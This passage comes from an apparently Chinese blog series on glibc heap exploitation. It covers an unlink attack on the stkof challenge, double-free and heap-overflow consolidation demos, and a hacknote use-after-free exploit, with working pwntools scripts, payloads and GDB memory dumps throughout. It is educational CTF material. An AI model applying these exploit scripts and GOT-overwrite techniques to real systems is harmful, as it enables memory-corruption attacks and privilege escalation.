<li><p>所以我们要得到需要写入的长度为0xa0 + 8*2 = 0xb0<br><img src="/images/heap_exp/2021-05-23-17-30-54.png" alt>   </p>
<ul>
<li>需要溢出chunk2的prev size和curent size两个字段，分别赋值为0xa0,和0xb0</li>
<li><p>因此我们构造的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送我们的数据之后的内存布局</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xe064e0:       0x0000000000000000      0x00000000000000a0</span><br><span class="line">0xe064f0:       0x0000000000602138      0x0000000000602140</span><br><span class="line">...</span><br><span class="line">0xe06580:       0x00000000000000a0      0x00000000000000b0</span><br><span class="line">0xe06590:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>然后我们需要释放chunk2指针</p>
<ul>
<li>执行<code>remove(3)</code></li>
<li>我们再次观察全局数组的存储变量<br><img src="/images/heap_exp/2021-05-23-17-46-43.png" alt></li>
<li>可以看到我们存储heap指针的地方已经变为了0x602150 - 3 * 8 = 0x0x602138</li>
<li>因此我们已经实现了unlink操作，后面可以通过操作0x602138指针来重写0x602150中的内容，我们可以借助这个实现往任意地址写入任意内容的操作，但是如何利用这个获取root shell呢？</li>
</ul>
</li>
<li>要想获取root shell我们就必须能够调用类似system的这种函数<ul>
<li>我们目前拥有对内存空间任意读写的能力，那么只要我们能够知道system函数的地址，我们就可以把system函数地址写入到一个会被调用的函数，如free，strlen等等的got表中，但是关键问题是如何获得system函数地址</li>
</ul>
</li>
<li>如何获得system函数地址<ul>
<li>由于二进制文件中没有调用system，所以不能通过plt调用system，我们只能想办法获得system在libc中的地址，但是由于开启了随机化后，这个地址就是不是固定的，索性的是我们可以通过其他库函数的地址，通过相对偏移获得system函数地址</li>
<li>那么问题转化成了如何获取其他库函数，比如strlen函数的地址<ul>
<li>由于strlen函数被调用了，那么二进制中的got表中就包含strlen项，如果我们能够通过puts，printf，write等函数打印这个strlen在got表中的地址，就能够得到got表中包含strlen的真实地址。</li>
<li>那么如何让打印函数传入got表的内存地址呢<ul>
<li>首先挑选一个打印函数，比如我们可以使用puts函数来打印内存，因为puts比较简单，只需要一个参数</li>
<li>然后再物色一个拥有参数是用户可控的地址的函数，这个要结合二进制函数的业务，符合这个条件的函数有<ul>
<li><code>strlen((&amp;global_var)[v1]) &lt;= 3</code></li>
<li><code>free((&amp;global_var)[v1])</code></li>
</ul>
</li>
<li>让(&amp;global_var)[v1]的值为got表一个库函数的地址值，比如free函数got表地址0x602018<ul>
<li>就是往内存中写入0x602018，这个是可以实现的，因为我们已经可以通过unlink拿到了对0x0x602138之后内存的读写权限，并且可以写入任意内容。</li>
</ul>
</li>
<li>然后我们通过修改free或者strlen的got表，让他们的内容修改为puts函数的plt表的地址，那么以后在调用free或者strlen函数的时候就可以调用puts</li>
<li>unlink之后我们可以读写地址为0x0602138开始的内存,借助这个我们可以修改0x602150内存中的内容为strlen got表地址，，strlen在got表中的地址为0x602030。修改0x602148中的内容为free got表地址0x602018</li>
<li>我们可以通过业务逻辑发送payload为<code>p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</code></li>
<li>发送payload之前0x602138中的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-19-25-19.png" alt></li>
</ul>
</li>
<li>发送payload之后的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-20-41-27.png" alt></li>
</ul>
</li>
<li>我们可以看到我们已经将strlen和free的got表地址写入到了数组中</li>
<li>我们再次利用业务逻辑就可以修改strlen的got表为puts.plt为0x400760<ul>
<li><img src="/images/heap_exp/2021-05-23-19-27-30.png" alt></li>
<li>这次的payload为p64(0x400760)</li>
<li>我们先看发送数据之前strlen got表中的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-19-30-09.png" alt></li>
<li>由于我们还没有调用这个函数，所以它的值为0</li>
</ul>
</li>
<li>然后我们看看发送完数据之后的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-20-09-18.png" alt></li>
<li>我们已经成功修改了strlen的got表，让他指向了puts</li>
</ul>
</li>
</ul>
</li>
<li>我们只需要调用strlen((&amp;global_var)[v1]) 让 (&amp;global_var)[v1]值为0x602018,就可以触发puts(0x602018)，而0x602018中存储的是真正的free函数的地址<ul>
<li>通过业务逻辑调用strlen，让v1为1的得到free的地址</li>
<li>得到free的地址为<br><img src="/images/heap_exp/2021-05-23-20-50-49.png" alt></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>拿到free的地址之后，我们就可以进一步得到system函数的地址，后面的事情就比较简单了。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>我的exp代码，到返回free地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(target, gdbscript=&apos;b *0x400b7a&apos;)</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def add(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recvline()</span><br><span class="line">  leak = leak.replace(&quot;\x0a&quot;, &quot;&quot;)</span><br><span class="line">  leak = u64(leak + &quot;\x00&quot;*(8-len(leak)))</span><br><span class="line">  print hex(leak)</span><br><span class="line">  #print &quot;men&quot;</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</span><br><span class="line">payload3 = p64(0x400760)</span><br><span class="line"></span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">write_data(2,0xb0,payload)</span><br><span class="line">remove(3)</span><br><span class="line">write_data(2,8*4,payload2)</span><br><span class="line">write_data(2,8,payload3)</span><br><span class="line">view(1)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>虽然这种unlink攻击并不能实现任意地址写入任意内容的攻击效果，但是如果符合这种一个数组中包含有一个指向堆的指针这种场景，并且这个堆可以溢出修改后面的chunk，即能够得到两个相邻的chunk，在free被溢出的chunk的时候，那么本来指向heap的指针就实际上指向的是数组，那么如果后续有用到heap指针的地方，就可以实现对数组的读写。</p>
<p>而实际上这个堆指针就是一个指向可以被用户读写的内存的指针，因此我们的利用思路可以是当有一个堆指针被写入了一个数组，我们通过溢出将存储这个堆指针的元素变成了存储数组的开头，然后我们通过业务代码继续操作这个被篡改了的“堆指针”去修改数组的内容，我们可以进一步修改存储这个“堆指针”的地方。</p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列二：堆漏洞</title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们要首先熟悉几种常见的堆漏洞类型，分别是Double Free，堆溢出以及UAF漏洞。一般是借助这些漏洞实现对free chunk的内容进行改写，进而实现漏洞利用</p>
<h2 id="Double-Free漏洞"><a href="#Double-Free漏洞" class="headerlink" title="Double Free漏洞"></a>Double Free漏洞</h2><p>顾名思义，这种漏洞的原因是由于错误导致2次对同一个chunk连续释放了两次导致。我们可以通过一个动态调试一个例子，看看对于double free到底是如何影响堆的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a Double Free bug.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of heap attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off by allocating three chunks of memory. Let&apos;s also write some data to them.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr0, *ptr1, *ptr2;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x30);</span><br><span class="line">    ptr1 = malloc(0x30);</span><br><span class="line">    ptr2 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    char *data0 = &quot;00000000&quot;;</span><br><span class="line">    char *data1 = &quot;11111111&quot;;</span><br><span class="line">    char *data2 = &quot;22222222&quot;;</span><br><span class="line"></span><br><span class="line">    memcpy(ptr0, data0, 0x8);</span><br><span class="line">    memcpy(ptr1, data1, 0x8);   </span><br><span class="line">    memcpy(ptr2, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk0: @ %p\t contains: %s\n&quot;, ptr0, ptr0);</span><br><span class="line">    printf(&quot;Chunk1: @ %p\t contains: %s\n&quot;, ptr1, ptr1);</span><br><span class="line">    printf(&quot;Chunk2: @ %p\t contains: %s\n\n&quot;, ptr2, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the bug comes in. We will free the same pointer twice (the first chunk pointed to by ptr0).\n&quot;);</span><br><span class="line">    printf(&quot;In between the two frees, we will free a different pointer. This is because in several different versions of malloc, there is a double free check \n(however in libc-2.27 it will hit the tcache and this will be fine).\n&quot;);</span><br><span class="line">    printf(&quot;It will check if the pointer being free is the same as the last chunk freed, and if it is the program will cease execution.\n&quot;);</span><br><span class="line">    printf(&quot;To bypass this, we can just free something in between the two frees to the same pointer.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0); //-----------------------&gt; b1</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr0); //-----------------------&gt; b2</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Next up we will allocate three new chunks of the same size that we freed, and write some data to them. This will give us the three chunks we freed.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr3 = malloc(0x30); //--------------&gt; b3</span><br><span class="line">    ptr4 = malloc(0x30);</span><br><span class="line">    ptr5 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    memcpy(ptr3, data0, 0x8);</span><br><span class="line">    memcpy(ptr4, data1, 0x8);   </span><br><span class="line">    memcpy(ptr5, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\t contains: %s\n&quot;, ptr3, ptr3);  //-------------&gt; b4</span><br><span class="line">    printf(&quot;Chunk4: @ %p\t contains: %s\n&quot;, ptr4, ptr4);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we allocated the same pointer twice, as a result of freeing the same pointer twice (since malloc will reuse freed chunks of similar sizes for performance boosts).\n&quot;);</span><br><span class="line">    printf(&quot;Now we can free one of the pointers to either Chunk 3 or 5 (ptr3 or ptr5), and clear out the pointer. We will still have a pointer remaining to the same memory chunk, which will now be freed.\n&quot;);</span><br><span class="line">    printf(&quot;As a result we can use the double free to edit a freed chunk. Let&apos;s see it in action by freeing Chunk3 and setting the pointer equal to 0x0 (which is what&apos;s supposed to happen to prevent UAFs).\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(ptr3);</span><br><span class="line">    ptr3 = 0x0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\n&quot;, ptr3);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we have freed ptr3 (Chunk 3) and discarded it&apos;s pointer. However we still have a pointer to it. Using that we can edit the freed chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *data3 = &quot;15935728&quot;;</span><br><span class="line">    memcpy(ptr5, data3, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that, we were able to use a double free to edit a free chunk!\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们编译好这个源代码，然后使用GEF GDB进行调试，笔者倾向于配合IDA看反编译代码。我们在b1处打断点，在GDB中观察heap的情况:<br><img src="/images/heap_exp/2021-05-18-14-49-52.png" alt><br>可以看到我们已经分配了3个chunk去存储了3个字符串。<br><img src="/images/heap_exp/2021-05-18-14-53-35.png" alt><br>而此时各种bin和tcache上面还是什么都没有，因为我们并没有释放任何chunk。<br>为了避免double free的检测，需要在连续free之间添加一个free(ptr1)，这样就可以绕过double free的检测,我们在b2进行断点在观察heap的情况<br><img src="/images/heap_exp/2021-05-18-14-57-21.png" alt><br><img src="/images/heap_exp/2021-05-18-14-57-45.png" alt><br>我们可以发现tcache的0x40大小的链表已经存储了两个free chunk。<br>再通过在b3处下断点，观察double free给heap造成的影响：后来发现直接被检测出了double free<br><img src="/images/heap_exp/2021-05-18-15-41-57.png" alt><br>发现应该是glibc的版本太高了，已经无法这么简单地绕过double free了，根据源代码中的提示，glibc版本为2.27，参考<a href="https://blog.csdn.net/weixin_44864859/article/details/107237134" target="_blank" rel="noopener">关于Linux下更换不同glibc版本的解决方法</a>，使用glibc-all-in-one和patchelf对编译好的二进制文件直接替换其ld和libc的链接库地址，指向2.27版本的再次进行调试.</p>
<p>在b2处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-50-32.png" alt><br>在b3处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-51-09.png" alt><br>经过两次释放我们我可以看到addr=0x555555758670这个chunk被放到了tcache 0x40 大小的链表上两次</p>
<p>在b4处下断点，观察新的3个malloc返回地址是什么，以及现在的heap状态<br><img src="/images/heap_exp/2021-05-18-16-07-37.png" alt><br><img src="/images/heap_exp/2021-05-18-16-08-01.png" alt><br>这个地方实际上GEF貌似是有点问题的，tcache里面实际上已经没有chunk了，count为0，但是还是显示有一个，这应该是是一个bug。 </p>
<p>标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-12-39.png" alt><br>我们可以看出来，ptr3和ptr5实际上是返回的同一块地址。</p>
<p>因此当后面我们继续释放ptr3，并且把ptr3的值指向0x0,我们还是可以操作这个已经被释放的块的<br>根据标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-18-05.png" alt></p>
<p>我们先不用管能够修改已经被释放的空闲块中的内容到底有什么用，我们只考虑现在我们的Double free是可以实现这个目标的，当我把剩下的heapoveflow和UAF介绍完了再去解释修改空闲块到底有什么意义。</p>
<p>所以double free到能修改free chunk最简单抽象是首先两次free同一块地址，然后再连续两次malloc相同大小，然后再free其中一个，那么剩下那个指针指向的就是空闲块的chunk，而且还是可以被修改的。总结就是2次free，2次malloc，一次free，最终得到可用的空闲块指针。</p>
<h2 id="堆溢出漏洞"><a href="#堆溢出漏洞" class="headerlink" title="堆溢出漏洞"></a>堆溢出漏洞</h2><p>下面我们将通过一个堆溢出实例，观察堆溢出是如何触发了空闲块的融合，并且得到空闲块的控制权的。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a heap overflow bug to cause consolidation.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating four separate chunks of memory. The first three will be used for the heap consolidation.\n&quot;);</span><br><span class="line">    printf(&quot;The last one will be used to essentially separate this from the heap wilderness, and we won&apos;t do anything with it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x500);</span><br><span class="line">    ptr1 = malloc(0x70);</span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    ptr3 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\t Size: 0x500\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Chunk 1: %p\t Size: 0x70\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Chunk 2: %p\t Size: 0x500\n&quot;, ptr2);</span><br><span class="line">    printf(&quot;Chunk 3: %p\t Size: 0x30\n\n&quot;, ptr3);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now the reason why the first and second chunks are 0x500 in sizes, is because they will be the ones we are freeing. In the most recent libc versions (2.26 &amp; 2.27), there is a tcache mechanism.\n&quot;);</span><br><span class="line">    printf(&quot;If these chunks were much smaller, they would be stored in the tcaching mechanism and this wouldn&apos;t work. So I made them large so they wouldn&apos;t end up in the tcache.\n\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Start off by freeing ptr0, and clearing the pointer (which is often done when heap chunks get freed to avoid a use after free).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);  //----------&gt;b1</span><br><span class="line">    ptr0 = 0;    //----------&gt;b2</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\n\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the heap overflow bug comes into play. We will overflow the heap metadata of ptr2. We can see that the size of ptr2 is 0x511.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Size of Chunk 2 @ %p\t Metadata Size: 0x%lx\n\n&quot;, ptr2, ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;0x500 bytes for the data, 0x10 bytes for the metadata, and 0x1 byte to designate that the previous chunk is in use. Our overflow will overwrite this, and the previous size value.\n&quot;);</span><br><span class="line">    printf(&quot;We will overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed (which it hasn&apos;t).\n&quot;);</span><br><span class="line">    printf(&quot;So following that, we will place a fake previous size which is the previous QWORD behind the size. We will put it as 0x590, so it thinks that the previous chunk goes all the way back to where Chunk 0 is.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free Chunk 2, it will consolidate the heap past chunk 1 and up to chunk 0. Then we can start allocating memory from where Chunk 0, and get an overlapping pointer to where Chunk 1 is, since it thinks it has been freed.\n&quot;);</span><br><span class="line">    printf(&quot;Let&apos;s do the overwrite.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[14] = 0x590;</span><br><span class="line">    ptr1[15] = 0x510;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 2 @ %p\nPrevious Size: 0x%lx\nSize: 0x%lx\n\n&quot;, ptr2, ptr2[-2], ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we free chunk 2 to cause consolidation.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2); //------------------&gt;b3</span><br><span class="line">    ptr2 = 0;   //------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can allocate a 0x500 chunk and an 0x70 chunk, and we wil get a pointer to where chunk 1 was.\n\n&quot;);</span><br><span class="line">    ptr4 = malloc(0x500);</span><br><span class="line">    ptr5 = malloc(0x70);    </span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 4: %p\t Size: 0x500\n&quot;, ptr4);</span><br><span class="line">    printf(&quot;Chunk 5: %p\t Size: 0x30\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that we can just free Chunk 1 (which is the same as Chunk 5), and we will be able to edit a freed heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1);  //-------------------&gt;b5</span><br><span class="line">    ptr1 = 0;   //-------------------&gt;b6</span><br><span class="line"></span><br><span class="line">    char *data = &quot;15935728\x00&quot;;</span><br><span class="line">    memcpy(ptr5, data, 0x9);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 5 @ %p\t Contains: %s\n\n&quot;, ptr5, (char *)ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that we use a heap overflow to cause a heap consolidation past an allocated chunk, get overlapping pointers, and edit a free chunk!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们先看看b1-b6几处的堆的情况。<br>在b1处下断点，目的是观察在free之前各个chunk的地址<br><img src="/images/heap_exp/2021-05-18-17-27-26.png" alt>  </p>
<p>在b2处下断点，我们得到heap bin的情况如下图<br><img src="/images/heap_exp/2021-05-18-17-28-36.png" alt><br>可以看出ptr0指向的chunk是被回收到了unsorted中，因为这个chunk已经超过tcache所能容纳的0x400的大小了，是直接由unsorted bin回收。<br>同时我们可以看下ptr2指向的chunk的metadata部分<br><img src="/images/heap_exp/2021-05-18-17-32-11.png" alt><br>如图所示，ptr2指向的chunk显示当前大小为0x510，而前一个紧邻的chunk的标志位为在使用</p>
<p>在b3处下断点，再看ptr2指向的chunk的大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Chunk(addr=0x555555758c00, size=0x510, flags=)</span><br><span class="line">    [0x0000555555758c00     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br></pre></td></tr></table></figure></p>
<p>可以看出prev_inuse标志位已经被置空，而且标志前一个chunk的大小的数据为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/g 0x555555758c00-8-8</span><br><span class="line">0x555555758bf0:	0x590</span><br></pre></td></tr></table></figure></p>
<p>因此<code>ptr1[14] = 0x590;ptr1[15] = 0x510;</code>已经成功溢出，并且覆盖了ptr2块的元数据，修改了prev_chunk_size和current_chunk_size以及prev_inuse标志位。这就会导致当free ptr2的chunk的时候，根据glibc的源代码，free的时候会进行向前和向后的合并，如果前面那个chunk或者后面紧邻的chunk都是未使用的话，则会把他们融合为一个大的chunk放到unsorted bin上。</p>
<p>在b4处下断点，看下是否如我们所愿，有一个ptr2 大小的chunk和一个0x590相加之后的chunk被放到了unsorted bin上了。<br><img src="/images/heap_exp/2021-05-18-17-44-15.png" alt><br>如我们所愿，一个0x510 + 0x590 = 0xaa0大小的chunk被放置到了unsorted bin上了，所以实际上ptr1虽然没有被释放，已经被回收到了unsorted bin中了</p>
<p>在b5处下断点，观察新分配的ptr4，和ptr5的来源是哪里<br><img src="/images/heap_exp/2021-05-18-17-58-45.png" alt><br><img src="/images/heap_exp/2021-05-18-17-59-23.png" alt><br>由图我们可知unsorted bin会被分割成合适大小的chunk分别返回给0x500和0x70的两个chunk。<br>ptr5指向的实际上与ptr1指向的是同一个地址，就是由于溢出导致错误的将ptr1收回到了unsorted bin中了。</p>
<p>在b6处下断点，观察ptr1回收到了什么地方<br><img src="/images/heap_exp/2021-05-18-17-56-06.png" alt><br>由于ptr1是0x80大小的chunk，因此还是在tcache的0x20~0x410的大小范围内的。</p>
<p>最后的打印输出也显示ptr5与ptr1是指向的相同的地方的，而此时ptr1已经是被会回收到了tcache中了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Chunk 1: 0x555555758b80	 Size: 0x70</span><br><span class="line"></span><br><span class="line">Chunk 5 @ 0x555555758b80	 Contains: 15935728</span><br></pre></td></tr></table></figure></p>
<p>这种攻击的方法主要是通过溢出，导致紧邻的chunk的头部被修改，包括标志位，以及前一个chunk的大小的修改，使得紧邻的chunk被free的时候能够造成错误的把一个chunk 回收，这样在后续的malloc中就可以直接修改这个错误回收的chunk的数据。这是一种比较常用的攻击手法，笔者在路由器的漏洞挖掘中曾经实用过这种攻击方法，并且成功拿到了root shell。</p>
<h2 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h2><p>UAF就是在释放之后仍然实用chunk，这个天然就是可以修改已经free的chunk。<br>实例采用一个经典的UAF练习<a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">hitcon training</a><br>利用代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./hacknote&apos;)</span><br><span class="line">elf = ELF(&apos;./hacknote&apos;)</span><br><span class="line"></span><br><span class="line">magic = 0x08048986</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(str(2))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def print_note(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(16,&apos;aa&apos;)</span><br><span class="line">create(16,&apos;bb&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">create(8,p32(magic))</span><br><span class="line">print_note(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>第一次调用malloc，生成一个struct note的结构，申请的是0x8大小的内存，实际上的chunk是0x8  + 0x8 = 0x10大小的chunk，malloc的返回地址是0x0804b1a0。<br>输入size为16，第二次调用malloc，为content生成内存空间，chunk大小为0x10 +0x8=0x18，返回地址为 0x0804b1b0。<br>不知为何heap chunks在这个地方是什么都不显示。只能依靠原始的方法在malloc处打断点，得到返回的地址。</p>
<p>第二次add node，第二次创建struct note, 堆地址为0x0804b1d0, content地址为0x0804b1e0 </p>
